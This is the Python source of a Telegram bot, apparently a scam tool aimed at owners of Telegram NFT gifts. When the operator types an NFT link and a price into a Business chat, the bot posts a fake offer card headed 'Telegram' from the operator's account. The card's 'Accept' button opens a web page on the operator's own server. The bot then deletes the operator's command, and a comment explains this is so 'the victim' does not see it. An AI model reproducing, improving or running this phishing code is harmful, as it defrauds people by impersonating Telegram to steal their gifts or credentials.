import os
import re
import asyncio
import logging
import sys
from aiogram import Bot, Dispatcher, F, Router
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode, ChatType
from aiogram.filters import Command
from aiogram.types import (Message, CallbackQuery, InlineKeyboardButton,
                           InlineKeyboardMarkup, WebAppInfo, BusinessConnection)
from dotenv import load_dotenv

from app import make_offer, get_offer, BASE

load_dotenv()
logging.basicConfig(level=logging.INFO, stream=sys.stdout)
log = logging.getLogger("offerbot")

BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID", "0"))
BASE_URL = os.getenv("WEBAPP_BASE", "http://localhost:8080")

bot = Bot(BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()
router = Router()
dp.include_router(router)

# Храним ID бизнес-подключения по ID владельца (тебя)
BUSINESS_CONN_ID = None

NFT_RE = re.compile(r"https?://t\.me/nft/([A-Za-z0-9_-]+)")
PRICE_RE = re.compile(r"(\d+)\s*(gram|грам|звезд|star|stars|⭐)", re.I)

def parse_nft(url: str):
    m = NFT_RE.search(url)
    if not m: return None
    slug_raw = m.group(1)
    parts = slug_raw.rsplit("-", 1)
    if len(parts) == 2 and parts[1].isdigit():
        name_raw, num = parts
    else:
        name_raw, num = slug_raw, ""
    display = re.sub(r"(?<!^)(?=[A-Z])", " ", name_raw).strip()
    full = f"{display} #{num}" if num else display
    return {"slug": slug_raw, "name": full}

def parse_price(text: str):
    m = PRICE_RE.search(text)
    if not m: return None
    amount, unit = m.group(1), m.group(2).lower()
    return f"{amount} Gram" if unit in ("gram", "грам") else f"{amount} Stars"


# ==========================================
# ЛОВИМ ВСЁ В BUSINESS-ЧАТАХ
# ==========================================
@router.business_message(F.text)
async def handle_business_message(msg: Message):
    global BUSINESS_CONN_ID

    # Если пишет не админ — игнорируем
    if msg.from_user and msg.from_user.id != ADMIN_ID:
        return

    # Ищем ссылку и цену
    nft = parse_nft(msg.text)
    price = parse_price(msg.text)

    if not nft or not price:
        return  # Обычная болтовня — пропускаем

    log.info(f"Перехват в бизнес-чате! nft={nft['name']}, price={price}")

    target_chat = msg.chat.id
    target_user = msg.from_user.username or "buyer"

    # Создаем оффер
    oid = make_offer(
        nft_name=nft["name"], nft_slug=nft["slug"], price=price,
        buyer=target_user, target_user="target", target_chat_id=target_chat)

    # Текст карточки
    text = (
        f"<b>Telegram</b>\n"
        f"<b>{nft['name']}</b>\n\n"
        f"Пользователь <b>{target_user}</b> "
        f"предлагает Вам <b>{price}</b> за подарок <b>{nft['name']}</b>.\n\n"
        f"Предложение действует ещё <b>6ч 0м</b>."
    )
    
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Отклонить", callback_data=f"reject:{oid}"),
         InlineKeyboardButton(text="Принять", web_app=WebAppInfo(url=f"{BASE_URL}/offer/{oid}"))]
    ])

    try:
        if not BUSINESS_CONN_ID:
            log.error("Нет BUSINESS_CONN_ID! Бот не подключен к Business.")
            return

        # Отправляем через Business (от твоего имени)
        await bot.send_message(
            chat_id=target_chat, 
            text=text, 
            reply_markup=kb, 
            business_connection_id=BUSINESS_CONN_ID
        )
        
        # УДАЛЯЕМ твое сообщение с командой, чтобы жертва его не видела
        try:
            await bot.delete_message(chat_id=msg.chat.id, message_id=msg.message_id)
        except Exception as e:
            log.warning(f"Не смог удалить сообщение: {e}")
            
    except Exception as e:
        log.error(f"Ошибка отправки: {e}")
        # Отправим ошибку тебе в личку, чтобы ты видел
        try:
            await bot.send_message(chat_id=ADMIN_ID, text=f"❌ Ошибка: {e}")
        except: pass


# ==========================================
# ПРИЕМ BUSINESS ПОДКЛЮЧЕНИЯ
# ==========================================
@router.business_connection()
async def on_business_conn(conn: BusinessConnection):
    global BUSINESS_CONN_ID
    BUSINESS_CONN_ID = conn.id
    log.info(f"✅ Business connection УСТАНОВЛЕН: user={conn.user.id} id={conn.id}")


# ==========================================
# ОТКЛОНЕНИЕ ОФФЕРА
# ==========================================
@router.callback_query(F.data.startswith("reject:"))
async def on_reject(cb: CallbackQuery):
    oid = cb.data.split(":", 1)[1]
    try:
        await cb.message.edit_reply_markup(reply_markup=None)
    except: pass
    await cb.answer("Отклонено")


# ==========================================
# ЗАПУСК
# ==========================================
async def main():
    log.info("Starting bot...")
    await dp.start_polling(bot)

if __name__ == "__main__":
    import threading
    from app import flask_app

    def _run_flask():
        port = int(os.getenv("PORT", "8080"))
        log.info(f"Flask listening on 0.0.0.0:{port}")
        flask_app.run(host="0.0.0.0", port=port, threaded=True, use_reloader=False)

    threading.Thread(target=_run_flask, daemon=True).start()
    asyncio.run(main())
